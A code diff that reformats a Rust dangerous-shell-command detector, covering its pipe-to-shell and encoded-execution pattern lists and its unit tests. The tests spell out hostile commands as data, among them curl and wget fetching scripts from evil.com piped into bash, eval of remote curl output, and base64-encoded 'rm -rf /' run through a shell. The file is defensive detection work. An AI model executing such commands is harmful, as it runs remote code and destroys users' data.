@@ -632,8 +632,15 @@ fn has_evasion_pattern(command: &str, cmd_lower: &str) -> bool {
 
     // curl | bash / wget | sh 管道模式
     let pipe_to_shell = [
-        "| bash", "| sh", "| zsh", "| /bin/bash", "| /bin/sh", "| /bin/zsh",
-        "|bash", "|sh", "|zsh",
+        "| bash",
+        "| sh",
+        "| zsh",
+        "| /bin/bash",
+        "| /bin/sh",
+        "| /bin/zsh",
+        "|bash",
+        "|sh",
+        "|zsh",
     ];
     if cmd_lower.contains("curl") || cmd_lower.contains("wget") {
         for pattern in &pipe_to_shell {
@@ -644,7 +651,8 @@ fn has_evasion_pattern(command: &str, cmd_lower: &str) -> bool {
     }
 
     // 编码/解码绕过：base64 decode 后执行
-    if (cmd_lower.contains("base64") && (cmd_lower.contains("-d") || cmd_lower.contains("--decode")))
+    if (cmd_lower.contains("base64")
+        && (cmd_lower.contains("-d") || cmd_lower.contains("--decode")))
         || cmd_lower.contains("openssl enc -d")
         || cmd_lower.contains("python -c")
         || cmd_lower.contains("perl -e")
@@ -653,8 +661,18 @@ fn has_evasion_pattern(command: &str, cmd_lower: &str) -> bool {
     {
         // 如果这些编码命令后面有 eval、exec、source、sh -c、bash -c 或管道
         let exec_indicators = [
-            "| bash", "| sh", "bash -c", "sh -c", "eval ", "exec ", "source ", "source<",
-            "|bash", "|sh", ". /dev/stdin", "$(",
+            "| bash",
+            "| sh",
+            "bash -c",
+            "sh -c",
+            "eval ",
+            "exec ",
+            "source ",
+            "source<",
+            "|bash",
+            "|sh",
+            ". /dev/stdin",
+            "$(",
         ];
         for indicator in &exec_indicators {
             if cmd_lower.contains(indicator) {
@@ -668,7 +686,10 @@ fn has_evasion_pattern(command: &str, cmd_lower: &str) -> bool {
     }
 
     // eval $(...) 动态执行模式
-    if cmd_lower.starts_with("eval ") || cmd_lower.contains("; eval ") || cmd_lower.contains("&& eval ") {
+    if cmd_lower.starts_with("eval ")
+        || cmd_lower.contains("; eval ")
+        || cmd_lower.contains("&& eval ")
+    {
         return true;
     }
 
@@ -829,22 +850,38 @@ mod tests {
         assert!(!is_dangerous_command("rm file.txt"));
 
         // base64 编码绕过
-        assert!(is_dangerous_command("echo 'cm0gLXJmIC8=' | base64 -d | bash"));
+        assert!(is_dangerous_command(
+            "echo 'cm0gLXJmIC8=' | base64 -d | bash"
+        ));
         assert!(is_dangerous_command("base64 -d <<<'cm0gLXJmIC8=' | sh"));
-        assert!(is_dangerous_command("echo cGFnZWQ9 | base64 --decode | xargs bash"));
+        assert!(is_dangerous_command(
+            "echo cGFnZWQ9 | base64 --decode | xargs bash"
+        ));
 
         // curl/wget pipe 绕过
-        assert!(is_dangerous_command("curl -s http://evil.com/script.sh | bash"));
-        assert!(is_dangerous_command("wget -q -O- http://evil.com/script.sh | sh"));
+        assert!(is_dangerous_command(
+            "curl -s http://evil.com/script.sh | bash"
+        ));
+        assert!(is_dangerous_command(
+            "wget -q -O- http://evil.com/script.sh | sh"
+        ));
 
         // eval 动态执行
         assert!(is_dangerous_command("eval $(echo rm -rf /)"));
-        assert!(is_dangerous_command("echo x && eval $(curl http://evil.com/cmd)"));
+        assert!(is_dangerous_command(
+            "echo x && eval $(curl http://evil.com/cmd)"
+        ));
 
         // 多语言编码器
-        assert!(is_dangerous_command("python -c 'import base64; print(base64.b64decode(\"\"))' | bash"));
-        assert!(is_dangerous_command("perl -e 'print unpack(\"u\",\"\")' | sh"));
-        assert!(is_dangerous_command("node -e 'console.log(Buffer.from(\"\",\"base64\").toString())' | bash"));
+        assert!(is_dangerous_command(
+            "python -c 'import base64; print(base64.b64decode(\"\"))' | bash"
+        ));
+        assert!(is_dangerous_command(
+            "perl -e 'print unpack(\"u\",\"\")' | sh"
+        ));
+        assert!(is_dangerous_command(
+            "node -e 'console.log(Buffer.from(\"\",\"base64\").toString())' | bash"
+        ));
 
         // 多层命令替换
         assert!(is_dangerous_command("$($(/bin/rm -rf /))"));
